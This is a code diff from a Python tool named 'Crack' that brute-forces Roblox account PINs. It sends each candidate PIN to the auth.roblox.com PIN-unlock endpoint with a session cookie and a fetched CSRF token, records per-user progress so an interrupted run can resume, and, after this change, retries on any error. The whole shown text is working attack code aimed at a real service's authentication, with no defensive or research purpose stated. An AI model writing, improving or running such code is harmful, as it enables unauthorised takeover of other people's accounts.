@@ -179,10 +179,6 @@ class Crack:
         for line, pin in enumerate(pins):
             uiprint(f"Trying {pin}...")
 
-            headers = {
-                'X-CSRF-TOKEN': self.getXsrf(cookie),
-            }
-
             progress = json.load(open("progress.json", "r"))
             with open("progress.json", "w+") as f:
                 progress[str(userid)] = int(line+startingLine)
@@ -193,10 +189,14 @@ class Crack:
             printed = False
 
             while True:
+
                 try:
-                    request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
-                except:
-                    pass
+                    request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers={
+                    'X-CSRF-TOKEN': self.getXsrf(cookie),
+                }, data={'pin': pin}, cookies=cookies)
+                except Exception as e:
+                    continue
+                
                 response = request.json()
                 status_code = request.status_code
 
